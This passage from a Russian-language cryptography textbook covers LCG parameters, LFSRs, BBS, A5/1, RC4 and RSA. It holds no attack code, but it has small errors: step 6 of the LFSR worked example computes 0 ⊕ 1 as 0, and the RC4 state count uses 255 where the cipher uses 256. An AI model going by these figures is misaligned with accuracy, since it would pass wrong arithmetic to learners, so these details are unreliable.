\cite{Press:2007}~Numerical Recipes: The Art of Scientific Computing	& 1664525	& 1013904223	& $2^{32}$	& 			\\
\cite{Knuth:2005}~MMIX in The Art of Computer Programming & \tiny{6364136223846793005} & \tiny{1442695040888963407}	& $2^{64}$	&	\\
\hline
\cite{Entacher:1997}~ANSI C:
\tiny{(Watcom, Digital Mars, CodeWarrior, IBM VisualAge C/C++)}		& 1103515245	& 12345		& $2^{31}$	& биты с 30 по 16-й	\\
\cite{Sirca:Horvat:2012}~glibc						& 1103515245	& 12345		& $2^{31}$	& биты с 30 по 0-й	\\
C99, C11 (ISO/IEC 9899) 						& 1103515245	& 12345		& $2^{32}$	& биты с 30 по 16-й	\\
C++11 (ISO/IEC 14882:2011) 						& 16807		& 0		& $2^{31} - 1$	& 			\\
Apple CarbonLib             			                       	& 16807		& 0		& $2^{31} - 1$	& 			\\
Microsoft Visual/Quick C/C++                                    	& 214013	& 2531011	& $2^{32}$	& биты с 30 по 16-й	\\
\hline
\cite{Bucknall:2001}~Borland Delphi					& 134775813	& 1		& $2^{32}$	& \\
\cite{MS-VBRAND:2004}~Microsoft Visual Basic \tiny{(версии 1--6)}	& 1140671485	& 12820163	& $2^{24}$	& 			\\
\cite{Mak:2003}~ Sun (Oracle) Java Runtime Environment			& 25214903917	& 11		& $2^{48} - 1$	& биты с 47 по 16-й	\\
\hline
\end{tabular}
\caption{Примеры параметров линейного конгруэнтного генератора в различных книгах, компиляторах и библиотеках времени исполнения\label{table:lcg}}
\end{table}
}
\end{landscape}


\section[РСЛОС]{Регистр сдвига с линейной обратной связью}\label{section-lfsr}
\selectlanguage{russian}

Другой схемой построения псевдослучайных генераторов является использование регистров сдвига с линейной обратной связью, а также их вариациями. Для начала рассмотрим простой РСЛОС, изображённый на рисунке~\ref{fig:lfsr}.

\begin{figure}[thb]
	\centering
	\includegraphics[width=0.75\textwidth]{pic/lfsr}
	\caption{Регистр сдвига с линейной обратной связью}
	\label{fig:lfsr}
\end{figure}

Регистр сдвига состоит из $n$ однобитовых ячеек $b_1, b_2, \dots, b_n$, содержащих 0 или 1, и линейной обратной связи, определяемой коэффициентами $C_1 = 1$, $C_2, C_3, \dots, C_n \in \{0, 1\}$. Многочлен над полем GF(2) вида $C_1 x^n + C_2 x^{n-1} + \dots + C_n x + 1$ называется характеристическим многочленом РСЛОС.

Начальным состоянием генератора является набор значений в битовых ячейках. На каждой итерации генератор вычисляет сумму по модулю два (то есть выполняет операцию XOR) значений ячеек, для которых $C_i=1$:
\[\begin{array}{ll}
	b_{n+1} &= \sum\limits_{i} C_i b_i \mod 2, \\
	b_{n+1} &= b_1 \oplus C_2 b_2 \oplus C_3 b_3 \oplus \dots \oplus C_n b_n.
\end{array}\]

Далее регистр сдвигает значения на одну ячейку влево. Самая правая ячейчка $b_n$ принимает вычисленное значение $b_{n+1}$:
\[\begin{array}{ll}
	b_1 & := b_2, \\
	b_2 & := b_3, \\
	\dots \\
	b_n & := b_{n+1}. \\
\end{array}
\]

Выходом генератора является значение ячейки $b_1$ после сдвига.

\example
Пусть регистр сдвига с линейной обратной связью задан характеристическим многочленом $m\left(x\right)=x^{5} + x^{3} + 1$. Как показано на рисунке, регистр состоит из пяти ячеек. В линейной обратной связи будут участвовать ячейки 1 и 3 (то есть $C_1 = 1, C_3 = 1$, остальные $C_i = 0$).

\begin{center}
	\begin{tikzpicture}[scale=0.05]
		\draw[black,very thick] (30,30) -- (30,40)~--- (40,40) -- (40,30) -- (30,30) -- (30,40);
		\draw[black,thick] (35,40) -- (35,50) -- (35,50) -- (37.5,50);
		\draw[black,very thick] (40,30) -- (40,40) -- (50,40) -- (50,30) -- (40,30) -- (40,40);
		\draw[black,very thick] (50,30) -- (50,40) -- (60,40) -- (60,30) -- (50,30) -- (50,40);
		\draw[black,thick] (55,40) -- (55,47.5);
		\draw[black,thick] (53.5,46) -- (55,47.5) -- (56.5,46);
		\draw[black,thick] (37.5,50) -- (52.5,50);
		\draw[black,thick] (51,51.5) -- (52.5,50) -- (51,48.5);
		\draw (55,50) circle [radius=2.5];
		\draw[black] (52.5,50) -- (57.5,50);
		\draw[black] (55,47.5) -- (55,52.5);
		\draw[black,very thick] (60,30) -- (60,40) -- (70,40) -- (70,30) -- (60,30) -- (60,40);
		\draw[black,very thick] (70,30) -- (70,40) -- (80,40) -- (80,30) -- (70,30) -- (70,40);
		\draw[black,thick] (57.5,50) -- (85,50) -- (85,35) -- (80,35);
		\draw[black,thick] (82.5,36.5) -- (80,35) -- (82.5,33.5);
		\draw[black,thick] (30,35) -- (15,35);
		\draw[black,thick] (20,30) -- (15,35) -- (20,40);
	\end{tikzpicture}
\end{center}

Если начальное состояние регистра равно $\vec{s_0} = (0, 0, 0, 0, 1)$, то дальнейшие внутренние состояния регистра $s_i$ и выходы генератора $r_i$ равны:

\begin{enumerate}
	\item $b_{n+1} = b_1 \oplus b_3 = 0 \oplus 0 = 0$, $\vec{s_1} = (0, 0, 0, 1, 0)$, $r_1 = b_1 = 0$;
	\item $b_{n+1} = b_1 \oplus b_3 = 0 \oplus 0 = 0$, $\vec{s_2} = (0, 0, 1, 0, 0)$, $r_2 = b_1 = 0$;
	\item $b_{n+1} = b_1 \oplus b_3 = 0 \oplus 1 = 1$, $\vec{s_3} = (0, 1, 0, 0, 1)$, $r_3 = b_1 = 0$;
	\item $b_{n+1} = b_1 \oplus b_3 = 0 \oplus 0 = 0$, $\vec{s_4} = (1, 0, 0, 1, 0)$, $r_4 = b_1 = 1$;
	\item $b_{n+1} = b_1 \oplus b_3 = 1 \oplus 0 = 1$, $\vec{s_5} = (0, 0, 1, 0, 1)$, $r_5 = b_1 = 0$;
	\item $b_{n+1} = b_1 \oplus b_3 = 0 \oplus 1 = 0$, $\vec{s_6} = (0, 1, 0, 1, 0)$, $r_6 = b_1 = 0$;
	\item $b_{n+1} = b_1 \oplus b_3 = 0 \oplus 0 = 0$, $\vec{s_7} = (1, 0, 1, 0, 0)$, $r_7 = b_1 = 1$;
	\item $b_{n+1} = b_1 \oplus b_3 = 1 \oplus 1 = 0$, $\vec{s_8} = (0, 1, 0, 0, 0)$, $r_8 = b_1 = 0$;
	\item и так далее.
\end{enumerate}

\exampleend

Максимальный период последовательности РСЛОС равен $2^n - 1$. Максимум достигается в том и только том случае, когда характеристический многочлен РСЛОС примитивен. В этом случае РСЛОС называют регистром сдвига максимального периода, а генерируемые им последовательности -- М-последовательностями, или же последовательностями максимального периода.

Если известна структура РСЛОС (значения коэффициентов $C_2, \dots, C_n$), то внутреннее состояние генератора можно восстановить по $n$ предыдущим выходам. По $2n$ предыдущим выходам генератора можно восстановить и внутреннее состояние, и структуру генератора. Зная структуру и текущее внутреннее состояние генератора, можно восстановить его предыдущие и следующие выходные значения.


\section[КСГПСЧ]{Криптографически стойкие генераторы псевдослучайных чисел}\label{section-crypto-random}\index{генератор!криптографически-стойкий}
\selectlanguage{russian}

Итак, просто генератором псевдослучайных чисел мы называем функцию $g$ вида
	\[g: \left\{0, 1\right\}^{n} \to \left\{0, 1\right\}^{q\left(n\right)},\]
вычислимую за полиномиальное время, результатом работы которой является последовательность чисел, обладающая свойствами случайной.

Были рассмотрены два генератора (линейный конгруэнтный генератор в разделе~\ref{section-linear-congruential-generator} и генератор на основе РСЛОС в разделе~\ref{section-lfsr}). Однако они обладают фундаментальными недостатками, которые не дают использовать их в криптографии. Зная определённое число предыдущих значений выхода генератора (и его внутреннее устройство), криптоаналитик имеет возможность предсказать следующие элементы последовательности. Избежать этого можно только увеличением размера внутреннего состояния.

Пусть $b \left( g \right)$ -- число предыдущих битов, которые необходимо знать криптоаналитику для восстановления внутреннего состояния и параметров генератора (и, следовательно, для предсказания дальнейшей последовательности). И для линейного конгруэнтного генератора\footnote{для получения параметров \texttt{a} и \texttt{c}}, и для генератора на основе РСЛОС функция $b (g)$ является линейной функцией от размера внутреннего состояния $size\left( g \right)$ в битах:

\[\begin{array}{l}
	b \left( LCG \right) = 3 \cdot size\left( g \right), \\
	b \left( LFSR \right) = 2 \cdot size\left( g \right). \\
\end{array}\]

То есть, если мы решим увеличить размер внутреннего состояния для защиты от криптоаналитика, это приведёт не более чем к линейному росту затрат последнего на необходимые вычисления (сравните это с экспоненциальным ростом затрат криптоаналитика при увеличении размера ключа для блочных шифров). Поэтому для использования в криптографии к генераторам псевдослучайных чисел предъявляются дополнительные требования.

\emph{Криптографически стойким генератором псевдослучайных чисел} будем называть функцию $g$ вида
	\[g: \left\{0, 1\right\}^{n} \to \left\{0, 1\right\}^{q\left(n\right)},\] 
вычислимую за полиномиальное время, результатом работы которой является последовательность чисел, удовлетворяющая тесту на следующий бит: не должно существовать полиномиального алгоритма, который по $k$ битам последовательности будет предсказывать следующий с вероятностью более $1/2$.

В 1982 году Эндрю Яо (\langen{Andrew Chi-Chih Yao},~\cite{Yao:1982}) доказал, что любой генератор, проходящий тест на следующий бит, сможет пройти и любые другие статистические полиномиальные тесты на случайность.

Как и в случае с блочными шифрами, да и с криптографией вообще, под криптографической стойкостью конкретных алгоритмов в 99\% случаев стоит понимать не принципиальное отсутствие, а неизвестность конкретных алгоритмов, которые могут предсказать выход генератора за полиномиальное время. Для тех генераторов, которые считались криптографически стойкими 20 лет назад, сегодня могут уже существовать алгоритмы для предсказания следующего элемента последовательности.


\subsection{Генератор BBS}
\selectlanguage{russian}

Имеются примеры <<хороших>> генераторов, вырабатывающих криптографически стойкие последовательности, например, генератор \textbf{Blum-Blum-Shub (BBS)}. Алгоритм работы состоит в следующем. Выбирают большие (длиной не менее 512 бит) простые числа $p, q$, которые при делении на $4$ дают в остатке $3$. Вычисляют $n = p q$. С помощью датчика случайных чисел вырабатывают  число $x_{0}$, где $1 \leq x_0 \leq n-1$ и $\gcd(x_0, n) = 1$. Далее проводят следующие вычисления:
\[ \begin{array}{l}
        x_{1} = x_{0}^{2} \mod n,\\
        x_{2} = x_{1}^{2} \mod n,\\
        \dots\\
        x_{N} = x_{N-1}^{2} \mod n.
\end{array} \]

Для каждого вычисленного значения оставляют один младший разряд. Вычисляют двоичную псевдослучайную последовательность $k_1 k_2 k_3 \dots$:
\[ \begin{array}{l}
        k_{1} = x_{1} \mod 2,\\
        k_{2} = x_{2} \mod 2,\\
        \dots \\
        k_{N} = x_{N} \mod 2.
\end{array} \]

Число $a$ называется \emph{квадратичным вычетом} по модулю $n$, если для него существует квадратный корень $b$ (или два корня): $a = b^2 \mod n$. Для $p,q ~=~ 3 \mod 4$ верно утверждение, что квадратичный вычет имеет единственный корень и операция $x \rightarrow x^2 \mod n$, примененная к элементам множества всех квадратичных вычетов $\set{QR}_n$ по модулю $n$, является перестановкой множества $\set{QR}_n$.

Полученная последовательность квадратичных вычетов $x_1, x_2, x_3, \dots$ -- периодическая с периодом $T < |\set{QR}_n|$. Чтобы ее период для случайного $x_0$ с большой вероятностью оказался большим, числа $p,q$ выбирают с условием малого $\gcd(\phi(p-1), \phi(q-1))$, где $\phi(n)$ -- функция Эйлера.

Полученная последовательность ключей является криптографически стойкой. Доказано, что для <<взлома>> (т.е. определения следующего символа с вероятностью отличной от $\frac{1}{2}$), требуется разложить число $n=pq$ на множители. Разложение числа на множители считается трудной задачей, все известные алгоритмы не являются полиномиальными по $\log_2 n$.

Оказывается, что если вместо одного последнего бита $k_i = x_i \mod 2$ брать $O(\log_2 \log_2 n)$ последних битов рассмотренного выше генератора $x_i$, то полученная последовательность останется криптостойкой.

Большой недостаток генератора BBS -- малая скорость генерирования бит.


\section{КСГПСЧ на основе РСЛОС}

Как уже упоминалось ранее, использование РСЛОС в качестве ГПСЧ не является криптографически стойким. Однако можно использовать комбинацию из нескольких регистров сдвига, чтобы в результате получить быстрый, простой (дешёвый) и надёжный (криптографически стойкий) генератор псевдослучайных чисел.

\subsection[Генераторы с несколькими регистрами сдвига]{Генераторы с несколькими регистрами \protect\\ сдвига}
\selectlanguage{russian}

Первый способ улучшения криптографических свойств последовательности состоит в создании композиционных генераторов из нескольких регистров сдвига при определённом способе выбора параметров. Схема такого генератора показана на рис.~\ref{fig:generators}. Здесь $L_i, ~ i = 1, 2, \dots, M$ -- регистры сдвига с линейной обратной связью. Вырабатываемые ими двоичные символы $x_{1,i}, x_{2,i}, \dots, x_{M,i}$ поступают синхронно на устройство преобразования, задаваемое булевой функцией $f(x_{1,i}, x_{2,i}, \dots, x_{M,i})$. В булевой функции и аргументы, и значения функции принимают значения $0$ или $1$.

Число ячеек в $i$-м регистре равно $L_{i}$, причём $\gcd(L_i, L_j)=1$ для $i \neq j$, где $\gcd$~--- наибольший общий делитель. Общее число ячеек $L = \sum\limits_{i=1}^M L_i$. Булева функция $f$ должна включать слагаемое по одному из входов, т.~е. $f = \dots + x_i + \dots$, для того чтобы двоичные символы на выходе этой функции были равновероятными. Период этого генератора может достигать величины (немного меньше)
    \[ T \simeq 2^L. \]

\begin{figure}[!ht]
	\centering
	\includegraphics[width=0.7\textwidth]{pic/generators}
    \caption{Генератор с несколькими регистрами сдвига\label{fig:generators}}
\end{figure}

Таким образом, увеличение числа регистров сдвига с обратной связью увеличивает период последовательности.

Одним из способов оценки криптостойкости генератора является оценка длина регистра с линейной обратной связью эквивалентного по порождаемой последовательности. Такой эквивалентный РСЛОС находится с помощью алгоритма Берлекэмпа~---~Мэсси\index{алгоритм!Берлекэмпа~---~Мэсси} декодирования циклических кодов. В лучшем случае длина эквивалентного регистра соизмерима с периодом последовательности, порождённой нелинейным генератором. В общем случае определение эквивалентной длины является сложной задачей.


\subsection{russian}[Генераторы с нелинейными преобразованиями]{Генераторы с нелинейными \protect\\ преобразованиями}

Известно, что любая булева функция $f(x_1, x_2,  \dots, x_M)$ может быть единственным образом записана многочленом Жегалкина\index{многочлен!Жегалкина}:
\[ \begin{array}{ll}
    f(x_1, x_2, \dots, x_M) & = ~c~ + \\
    & + \sum\limits_{1 \leq i \leq M} c_i x_i + \\
    & + \sum\limits_{1 \leq i < j \leq M} c_{i,j} x_i x_j + \\
    & + \sum\limits_{1 \leq i < j < k \leq M} c_{i,j,k} x_i x_j x_k + \\
    & + \dots + \\
    & + ~ c_{1,2,\dots,M} ~ x_1 x_2 \dots x_M.
\end{array} \]

%Криптографу рекомендуется выбирать булеву функцию с возможно большим числом ненулевых коэффициентов при квадратичных членах полинома Жегалкина.

Второй способ улучшения криптостойкости последовательности поясняется с помощью рис. \ref{fig:lfsr-zhegalkin}, на котором представлен регистр сдвига с $M$ ячейками, и устройства, осуществляющего преобразование с помощью булевой функции $f(x_1, x_2, \dots, x_M)$, причем функция $f$ содержит нелинейные члены, то есть произведения $x_i x_j \dots$. Тактовый вход здесь такой же, как у регистров, показанных на других рисунках.

Если функция $f$ нелинейная, то в общем случае не известен полиномиальный алгоритм восстановления состояния регистров по нескольким последним выходам генератора. Таким образом, использование нескольких регистров сдвига увеличивает максимально возможный период по сравнению с одним регистром до $T < 2^{L_1 + L_2 + \dots + L_M}$, а нелинейность функции $f$ позволяет избежать простого нахождения состояния по выходу. Чтобы улучшить криптостойкость последовательности, порождаемой  регистром, рекомендуется брать много нелинейных членов многочлена Жегалкина.

Такой подход применен в системе GPS. Удачных попыток ее взлома до сих пор нет.

\begin{figure}[h!]
    \centering
	\includegraphics[width=0.4\textwidth]{pic/lfsr-zhegalkin}
    \caption{Криптографический генератор с нелинейной булевой функцией\label{fig:lfsr-zhegalkin}}
\end{figure}


\subsection[Мажоритарные генераторы, шифр A5/1]{Мажоритарные генераторы на примере алгоритма шифрования A5/1}\label{section:majority_generators}\index{шифр!A5}
\selectlanguage{russian}

Третий способ улучшения криптостойкости последовательностей поясняется с помощью рис.~\ref{fig:gsm-a51-cipher}, на котором показан мажоритарный генератор ключей алгоритма потокового шифрования A5/1 стандарта GSM. В отличие от случая нелинейного комбинирования выходов нескольких регистров в этом случае применён условный сдвиг регистров, то есть на каждом такте некоторые регистры могут не сдвигаться, а оставаться в прежнем состоянии. На рисунке показана схема из трёх регистров сдвига с различными многочленами обратной связи (здесь применена обратная нумерация ячеек, коэффициентов и переменных по сравнению с предыдущими разделами):
\[ \left\{ \begin{array}{l}
    c_1(y) = y^{19} + y^{18} + y^{17} + y^{14} + 1, \\
    c_2(y) = y^{22} + y^{21} + 1, \\
    c_3(y) = y^{23} + y^{22} + y^{21} + y^8 + 1.
\end{array} \right. \]

\begin{figure}[!ht]
    \centering
	\includegraphics[width=\textwidth]{pic/gsm-a51-cipher}
    \caption{Регистр сдвига алгоритма шифрования A5/1\label{fig:gsm-a51-cipher}}
\end{figure}

В алгоритме A5/1 регистры сдвигаются не на каждом такте. Правило сдвига следующее. В каждом регистре есть один тактовый бит, определяющий сдвиг,~-- восьмой бит $\textrm{C1}$ для первого регистра, десятые биты $\textrm{C2}$ и $\textrm{C3}$ для второго и третьего регистров. На каждом такте вычисляется мажоритарное значение тактового бита $m = \textrm{majority}(\textrm{C1}, \textrm{C2}, \textrm{C3})$, то есть по большинству значений: 0 или 1. Если для данного регистра значение тактового бита совпадает с мажоритарным решением, то регистр сдвигается. Если не совпадает, то остаётся в прежнем состоянии без сдвига на следующий такт. Так как всего состояний тактовых битов $2^3$, то в среднем каждый регистр сдвигается в $\frac{3}{4}$ всех тактов.

Общее количество ячеек всех трёх регистров $19+22+23=64$, следовательно, период генератора A5/1: $T < 2^{64}$. Данный шифр не может считаться стойким из-за возможности полного перебора. Например, известны атаки на шифр A5/1, требующие 150-300 GiB оперативной памяти и нескольких минут вычислений одного ПК (2001 г.).



\chapter{Потоковые шифры}\label{chapter-stream-ciphers}
\selectlanguage{russian}

Потоковые шифры осуществляют посимвольное шифрование открытого текста. Под символом алфавита открытого текста могут пониматься как отдельные биты (побитовое шифрование), так и байты (побайтовое шифрование). Поэтому можно говорить о в какой-то мере условном разделении блочных и потоковых шифров: например 64-битная буква - один блок. Общий вид большинства потоковых шифров приведён на рис.~\ref{fig:stream-cipher}.

\begin{figure}[hb]
	\centering
	\includegraphics[width=0.66\textwidth]{pic/stream-cipher}
  \caption{Общая структура шифрования с использованием потоковых шифров}
  \label{fig:stream-cipher}
\end{figure}

\begin{itemize}
	\item Перед началом процедуры шифрования отправитель и получатель должны обладать общим секретным ключом.
	\item Секретный ключ используется для генерации инициализирующей последовательности (\langen{seed}) генератора псевдослучайной последовательности.
	\item Генераторы отправителя и получателя используются для получения одинаковой псевдослучайной последовательности символов, называемой \emph{гаммой}\index{гамма}. Последовательности одинаковые, если для их получения использовались одинаковые ГПСЧ, инициализированные одной и той же инициализирующей последовательностью, при условии, что генераторы детерминированные.
	\item Символы открытого текста на стороне отправителя складываются с символами гаммы с использованием простейших обратимых преобразований. Например, побитовое сложение по модулю 2 (операция <<исключающее или>>, \langen{XOR}). Полученный шифртекст передаётся по каналу связи.
	\item На стороне легального получателя с символами шифртекста и гаммы выполняется обратная операция (для XOR это будет просто повторный XOR) для получения открытого текста.
\end{itemize}

Очевидно, что криптостойкость потоковых шифров непосредственно основана на стойкости используемых ГПСЧ. Большой размер инициализирующей последовательности, длинный период, большая линейная сложность -- необходимые атрибуты используемых генераторов. Одним из преимуществ потоковых шифров по сравнению с блочными является более высокая скорость работы.

Одним из примеров ненадёжных потоковых шифров является семейство A5\index{шифр!A5} (A5/1, A5/2), кратко рассмотренное в разделе~\ref{section:majority_generators}. Мы также рассмотрим вариант простого в понимании шифра RC4, не основанного на РСЛОС.

\section{Шифр RC4}\label{rc4}\index{шифр!RC4|(}
\selectlanguage{russian}

Шифр RC4 был разработан Роном Ривестом (\langen{Ronald Linn Rivest}) в 1987 году для компании RSA Data Security. Описание алгоритма было впервые анонимно опубликовано в телеконференции Usenet sci.crypt в 1994 году\footnote{См. раздел 17.1. <<Алгоритм RC4>> в~\cite{Schneier:2002}.}.

Генератор, используемый в шифре, хранит своё состояние в массиве из 256 ячеек $S_0, S_1, \dots, S_{255}$, заполненных значениями от 0 до 255 (каждое значение встречается только один раз), а также двух других переменных размером в 1 байт $i$ и $j$. Таким образом, количество различных внутренних состояний генератора равно $255! \times 255 \times 255 \approx 2.17 \times 10^{509} \approx 2^{1962}$.

Процедура инициализации генератора.
\begin{itemize}
	\item Для заполнения байтового массива из 256 ячеек $K_0, K_1, \dots, K_{255}$ используется предоставленный ключ. При необходимости (если размер ключа менее 256-ти байтов) ключ используется несколько раз, пока массив $K$ не будет заполнен целиком.
	\item Начальное значение $j$ равно $0$.
	\item Далее для значений $i$ от $0$ до $255$ выполняется:
	\begin{enumerate}
		\item $j:= (j + S_i + K_i) \mod 256$,
		\item поменять местами $S_i$ и $S_j$.
	\end{enumerate}
\end{itemize}

Процедура получения следующего псевдослучайного байта $result$ (следующего байта гаммы):
\begin{enumerate}
	\item $ i := (i + 1) \mod 256$,
	\item $ j := (j + S_i) \mod 256$,
	\item поменять местами $S_i$ и $S_j$,
	\item $ t := ( S_i + S_j ) \mod 256$,
	\item $ result := S_t$.
\end{enumerate}

По утверждению Брюса Шнайера, алгоритм настолько прост, что большинство программистов могут закодировать его по памяти. Шифр RC4 использовался во многих программных продуктах, в том числе в IBM Lotus Notes, Apple AOCE, Oracle Secure SQL и Microsoft Office, а также в стандарте сотовой передачи цифровых данных CDPD. В настоящий момент шифр не рекомендуется к использованию~\cite{rfc7465}, в нём были найдены многочисленные, хотя и некритичные уязвимости~\cite{Fluhrer:Mantin:Shamir:2001,Mantin:Shamir:2002,Paul:Maitra:2007,Sepehrdad:Vaudenay:Vuagnoux:2011}.

\index{шифр!RC4|)}



\subimport*{hash-functions/}{index}

\chapter{Асимметричные криптосистемы}\label{chapter-public-key}
\selectlanguage{russian}

\emph{Асимметричной криптосистемой} или же \emph{криптосистемой с открытым ключом} (\langen{public-key cryptosystem, PKC}) называется криптографическое преобразование, использующее два ключа -- открытый и закрытый. Пара из \emph{закрытого}\index{ключ!закрытый} (\langen{private key, secret key, SK})\footnote{В контексте криптосистем с открытым ключом можно ещё встретить использование термина <<секретный ключ>>. Мы не рекомендуем использовать данный термин, чтобы не путать с секретным ключом\index{ключ!секретный}, используемым в симметричных криптосистемах.} и \emph{открытого}\index{ключ!открытый} (\langen{public key, PK}) ключей создаётся пользователем, который свой закрытый ключ держит в секрете, а открытый ключ делает общедоступным для всех пользователей. Криптографическое преобразование в одну сторону (шифрование) можно выполнить, зная только открытый ключ, а в другую (расшифрование) -- зная только закрытый ключ. Во многих криптосистемах из закрытого ключа теоретически можно вычислить открытый ключ, однако это является сложной вычислительной задачей.

Если прямое преобразование выполняется открытым ключом, а обратное -- закрытым, то криптосистема называется \emph{схемой шифрования с открытым ключом}. Все пользователи, зная открытый ключ получателя, могут зашифровать для него сообщение, которое может расшифровать только владелец закрытого ключа.

Если прямое преобразование выполняется закрытым ключом, а обратное -- открытым, то криптосистема называется \emph{схемой электронной подписи (ЭП)}. Владелец закрытого ключа может \emph{подписать} сообщение, а все пользователи, зная открытый ключ, могут проверить, что подпись была создана только владельцем закрытого ключа и никем другим.

Криптосистемы с открытым ключом снижают требования к каналам связи, необходимые для передачи данных. В симметричных криптосистемах перед началом связи (перед шифрованием сообщения и его передачей) требуется передать или согласовать секретный ключ шифрования по защищённому каналу связи. Злоумышленник не должен иметь возможность ни прослушать данный канал связи, ни подменить передаваемую информацию (ключ). Для надёжной работы криптосистем с открытым ключом необходимо, чтобы злоумышленник не имел возможности подменить открытый ключ легального пользователя. Другими словами, криптосистема с открытым ключом, в случае использования открытых и незащищённых каналов связи, устойчива к пассивному криптоаналитику\index{криптоаналитик!пассивный}, но всё ещё должна предпринимать меры по защите от активного криптоаналитика\index{криптоаналитик!активный}.

Для предотвращения атак <<человек посередине>> (\langen{man-in-the-middle attack})\index{атака!<<человек посередине>>} с активным криптоаналитиком\index{криптоаналитик!активный}, который бы подменял открытый ключ получателя во время его передачи будущему отправителю сообщений, используют \emph{сертификаты открытых ключей}\index{сертификат открытого ключа}. Сертификат представляет собой информацию о соответствии открытого ключа и его владельца, подписанную электронной подписью третьего лица. В корпоративных информационных системах организация может обойтись одним лицом, подписывающим сертификаты. В этом случае его называют \emph{доверенным центром сертификации} или \emph{удостоверяющим центром}. В глобальной сети Интернет для защиты распространения программного обеспечения (например, защиты от подделок в ПО) и проверок сертификатов в протоколах на базе SSL/TLS\index{протокол!SSL/TLS} используется иерархия удостоверяющих центров, рассмотренная в разделе~\ref{section-CAs}. При обмене личными сообщениями и при распространении программного обеспечения с открытым кодом вместо жёсткой иерархии может использоваться \emph{сеть доверия}\index{сеть доверия}. В сети доверия каждый участник может подписать сертификат любого другого участника. Предполагается, что подписывающий знает лично владельца сертификата и удостоверился в соответствии сертификата владельцу при личной встрече.

Криптосистемы с открытым ключом построены на основе односторонних (однонаправленных) функций с потайным входом. Под \emph{односторонней} функцией понимают \emph{вычислительную} невозможность вычисления её обращения: вычисление значения функции $y = f(x)$ при заданном аргументе $x$ является лёгкой задачей, вычисление аргумента $x$ при заданном значении функции $y$ -- трудной задачей.

Односторонняя функция $y = f(x,K)$ с \emph{потайным входом}\index{функция!с потайным входом} $K$ определяется как функция, которая легко вычисляется при заданном $x$, и аргумент $x$ которой можно легко вычислить из $y$, если известен <<секретный>> параметр $K$, и вычислить невозможно, если параметр $K$ неизвестен.

Примером подобной функции является возведение в степень по модулю составного числа $n$:
	\[ c = f \left( m \right) = m ^ e \mod n.\]

Для того, чтобы быстро вычислить обратную функцию
	\[ m = f^{-1} \left( c \right) = \sqrt[e]{c} \mod n, \]
её можно представить в виде
	\[ m = c^{d} \mod n,\]
где
	\[ d = e^{-1} \mod \varphi \left( n \right). \]

В последнем выражении $\varphi \left( n \right)$ -- это функция Эйлера\index{функция!Эйлера}. В качестве <<потайной дверцы>> или секрета можно рассматривать или непосредственно само число $d$, или значение $\varphi \left( n \right)$. Последнее можно быстро найти только в том случае, если известно разложение числа $n$ на простые сомножители. Именно эта функция с потайной дверцей лежит в основе криптосистемы RSA\index{криптосистема!RSA}.

Необходимые математические основы модульной арифметики, групп, полей и простых чисел приведены в приложении~\ref{chap:discrete-math}.

\section{Криптосистемы RSA}
\selectlanguage{russian}
\index{криптосистема!RSA}

\subsection[Шифрование]{Шифрование RSA}

В 1978 г. Рональд Рив\'{е}ст, Ади Шамир и Леонард Адлеман  (R. Rivest, A. Shamir, L. Adleman) предложили алгоритм, обладающий рядом интересных для криптографии свойств. На его основе была построена первая система шифрования с открытым ключом, получившая название по первым буквам фамилий авторов -- система RSA.

Рассмотрим принцип построения криптосистемы шифрования RSA с открытым ключом.

\begin{enumerate}
    \item \textbf{Создание пары из секретного и открытого ключей.}
        \begin{enumerate}
            \item Случайно выбрать большие простые различные числа $p,q$, для которых $\log_2 p \simeq \log_2 q > 512$ бит.
            \item Вычислить произведение $n = pq$.
            \item Вычислить функцию Эйлера $\varphi(n) = (p-1)(q-1)$.
            \item Выбрать случайное целое число $e \in [2, \varphi(n)-1]$ взаимно простое с $\varphi(n)$: $~ \gcd(e, \varphi(n)) = 1$. Свойство проверяют с помощью алгоритма Евклида.
            \item Вычислить число $d$, такое, что  $d e= 1 \mod \varphi(n)$. Для вычисления используется расширенный алгоритм Евклида.
            \item Секретный ключ -- $\SK$, открытый ключ -- $\PK$
                \[ \SK = (d), ~ \PK = (n, e). \]

        \end{enumerate}

Генерация модуля $n = pq$ RSA системы является трудной задачей. Действительно, количество нечетных целых длиной точно 500 бит равно $2^{(500-2)}$. Среди них имеется примерно
$(2^{500})/500 - (2^{499})/499 \approx (2^{500})/1000$ простых 500-разрядных чисел. Вероятность случайного выбора простого числа составляет примерно $1/250 $.
Поиск случайных больших простых чисел $p,q$ состоит в генерации случайного нечетного целого числа и проверке его по критериям простоты. Самый распространенный критерий -- вероятностный тест Миллера--Рабина\index{тест!Миллера-Рабина}. Все вероятностные тесты либо \emph{точно} определяют, что данное число составное, либо что оно \emph{возможно} простое. При $t$-кратной проверке тестом Миллера--Рабина со всеми положительными ответами <<возможно простое>> существует вероятность ошибки $P < \left( \frac{1}{4} \right)^t$, т.е. ненулевая вероятность того, что число окажется, на самом деле, составным. Существуют и многие другие детерминированные и вероятностные тесты на простоту числа.

Криптостойкость RSA системы определяется сложностью разложения на сомножители целого $n$-разрядного числа и отсутствием <<лишних>> делителей.

    \item \textbf{Шифрование на открытом ключе $\PK$.}
        \begin{enumerate}
            \item Сообщение представляют целым числом $m \in [1, n-1]$.
            \item Шифротекст вычисляется как
                \[ c = m^e \mod n. \]
                Шифротекст -- тоже целое число из диапазона $[1, n-1]$.
        \end{enumerate}
    \item \textbf{Расшифрование на секретном ключе $\SK$.}
        \begin{enumerate}
            \item Владелец секретного ключа вычисляет
                \[ m = c^d \mod n. \]
            \item Покажем верность расшифрования. Пусть
                \[ ed = 1 + a \varphi(n). \]
                Если $m$ и $n$ взаимно простые, то по теореме Эйлера (по модулю $n$):
                \[ c^d = m ^{ed} = m^1 m^{a\varphi(n)} = m \cdot 1^a = m \mod n. \]

                В общем случае $m$ и $n$ могут иметь общие делители, но расшифрование тоже оказывается верным. Пусть $m = 0 \mod p$. По китайской теореме об остатках:
                \[
                     m = c^d \mod n ~\Leftrightarrow~
                     \left\{ \begin{array}{l}
                        m = c^d \mod p, \\
                        m = c^d \mod q. \\
                     \end{array} \right..
                \]
                Подставляя $c=m^e$, получаем тождество
                \[ \left\{ \begin{array}{l}
                    m^{ed} = 0 = m \mod p, \\
                    m^{ed} = m  \left( m^{q-1} \right)^{a(p-1)} = m \cdot 1^{a(p-1)} = m \mod q. \\
                \end{array} \right. \]
                Следовательно, $m^{ed} = m \mod pq$.
        \end{enumerate}
\end{enumerate}


Что касается вычислительной сложности других операций, то применение алгоритма Евклида для проверки, является ли число $e$  взаимно простым с числами $p-1, q-1$, а также вычисление обратного элемента $d$, считается легкой задачей (задачей с квадратичной сложностью, не более).
